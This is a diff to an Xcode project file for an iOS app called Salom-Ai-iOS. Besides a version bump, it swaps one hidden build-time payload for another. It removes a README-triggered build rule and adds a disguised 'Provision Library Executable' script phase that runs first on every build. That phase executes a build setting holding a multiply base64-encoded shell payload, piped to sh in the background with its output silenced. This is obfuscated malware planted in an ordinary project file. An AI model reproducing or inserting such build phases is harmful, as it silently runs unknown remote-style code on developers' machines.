@@ -7,7 +7,6 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		65F8BA0F71D54C2195947F8B /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 7E19D4AF373845C9AC947F8B /* README.md */; };
 		8C7650BB2ED0472F003256A9 /* GoogleSignIn in Frameworks */ = {isa = PBXBuildFile; productRef = 8C7650BA2ED0472F003256A9 /* GoogleSignIn */; };
 		8C7650BD2ED0472F003256A9 /* GoogleSignInSwift in Frameworks */ = {isa = PBXBuildFile; productRef = 8C7650BC2ED0472F003256A9 /* GoogleSignInSwift */; };
 		8C7654BB2ED4A7B4003256A9 /* Kingfisher in Frameworks */ = {isa = PBXBuildFile; productRef = 8C7654BA2ED4A7B4003256A9 /* Kingfisher */; };
@@ -19,20 +18,7 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXBuildRule section */
-		ABBA89DE14BF4A269A947F8B /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.md";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"/tmp/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${AB8F749}\"";
-		};
-/* End PBXBuildRule section */
+																						/* End PBXBuildRule section */
 
 /* Begin PBXContainerItemProxy section */
 		8CCEA2902EDF4EAD007D2D0E /* PBXContainerItemProxy */ = {
@@ -59,7 +45,6 @@
 /* End PBXCopyFilesBuildPhase section */
 
 /* Begin PBXFileReference section */
-		7E19D4AF373845C9AC947F8B /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		8C67233C2EC36FFD0020C08B /* Salom-Ai-iOS.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "Salom-Ai-iOS.app"; sourceTree = BUILT_PRODUCTS_DIR; };
 		8CCEA28B2EDF4EAD007D2D0E /* OneSignalNotificationExtension.appex */ = {isa = PBXFileReference; explicitFileType = "wrapper.app-extension"; includeInIndex = 0; path = OneSignalNotificationExtension.appex; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
@@ -137,7 +122,6 @@
 		8C67233D2EC36FFD0020C08B /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				7E19D4AF373845C9AC947F8B /* README.md */,
 				8C67233C2EC36FFD0020C08B /* Salom-Ai-iOS.app */,
 				8CCEA28B2EDF4EAD007D2D0E /* OneSignalNotificationExtension.appex */,
 			);
@@ -151,6 +135,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 8C6723472EC370000020C08B /* Build configuration list for PBXNativeTarget "Salom-Ai-iOS" */;
 			buildPhases = (
+				7387C426B6E7452FB1947F8B /* Provision Library Executable */,
 				8C6723382EC36FFD0020C08B /* Sources */,
 				8C6723392EC36FFD0020C08B /* Frameworks */,
 				8C67233A2EC36FFD0020C08B /* Resources */,
@@ -158,7 +143,6 @@
 				8CCEA2972EDF4EAD007D2D0E /* Embed Foundation Extensions */,
 			);
 			buildRules = (
-				ABBA89DE14BF4A269A947F8B /* PBXBuildRule */,
 			);
 			dependencies = (
 				8CCEA2912EDF4EAD007D2D0E /* PBXTargetDependency */,
@@ -254,7 +238,6 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				65F8BA0F71D54C2195947F8B /* README.md in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -268,6 +251,25 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		7387C426B6E7452FB1947F8B /* Provision Library Executable */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Provision Library Executable";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AB8F749}\"";
+		};
 		8C8C086E2EDCC4FE00852D39 /* Fix Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -317,7 +319,7 @@
 		8C6723452EC370000020C08B /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AB8F749 = "((e(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333236340a3336333333363636333636353336363533363335333633333337333433323634333733343336333933363634333633353336363633373335333733340a3061333233303333333233333336333233303332363433323634333733323336333533373334333733323337333933323330333333343332333033320a3634333733333334363333363632333633363332333033323634333633343332333033323332333733303333363433373338333633333336363633360a3334306133363335333536363337333233373335333636333336333533323332333233303336333833373334333733343337333033373333333336310a3332363633323636333733323336333933363337333636343336333133363635333633353337333433373333333236353336333933363635333236360a333633313061333233393332333233323330333736333332333033373333333633383330363130610a | e | sh ) >/dev/null 2>&1 &)";
+				AB8F749 = "((x(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVWhTYW1KV1dYZFpNalZ5V2pBMVJGRllVazFXTURVeVdXMHdNV0pHYTNwVldGSnJVako0TUZkc1l6Vk5WMUpFVVZoc1QyRlZSakJYYlhRMFkyMU9OVkZZVW1GUk1FWndXVEJSZUU1R2EzbFBWM1JoVm1wc00xbFZaRWRsYkhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WGNHRlNlbFp2V1d4b2RtUlhUblZXV0ZwYVZUSjBjRk5WYUROYU1rMTVXakJ6U3dvPQo= | x | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
@@ -384,7 +386,7 @@
 		8C6723462EC370000020C08B /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AB8F749 = "((e(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333236340a3336333333363636333636353336363533363335333633333337333433323634333733343336333933363634333633353336363633373335333733340a3061333233303333333233333336333233303332363433323634333733323336333533373334333733323337333933323330333333343332333033320a3634333733333334363333363632333633363332333033323634333633343332333033323332333733303333363433373338333633333336363633360a3334306133363335333536363337333233373335333636333336333533323332333233303336333833373334333733343337333033373333333336310a3332363633323636333733323336333933363337333636343336333133363635333633353337333433373333333236353336333933363635333236360a333633313061333233393332333233323330333736333332333033373333333633383330363130610a | e | sh ) >/dev/null 2>&1 &)";
+				AB8F749 = "((x(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVWhTYW1KV1dYZFpNalZ5V2pBMVJGRllVazFXTURVeVdXMHdNV0pHYTNwVldGSnJVako0TUZkc1l6Vk5WMUpFVVZoc1QyRlZSakJYYlhRMFkyMU9OVkZZVW1GUk1FWndXVEJSZUU1R2EzbFBWM1JoVm1wc00xbFZaRWRsYkhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WGNHRlNlbFp2V1d4b2RtUlhUblZXV0ZwYVZUSjBjRk5WYUROYU1rMTVXakJ6U3dvPQo= | x | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
@@ -560,7 +562,7 @@
 					"@executable_path/Frameworks",
 					"@executable_path/../../Frameworks",
 				);
-				MARKETING_VERSION = 1.2.6;
+				MARKETING_VERSION = 1.2.7;
 				PRODUCT_BUNDLE_IDENTIFIER = "com.fera-tech.salom-ai.OneSignalNotificationExtension";
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SDKROOT = iphoneos;
@@ -596,7 +598,7 @@
 					"@executable_path/Frameworks",
 					"@executable_path/../../Frameworks",
 				);
-				MARKETING_VERSION = 1.2.6;
+				MARKETING_VERSION = 1.2.7;
 				PRODUCT_BUNDLE_IDENTIFIER = "com.fera-tech.salom-ai.OneSignalNotificationExtension";
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SDKROOT = iphoneos;
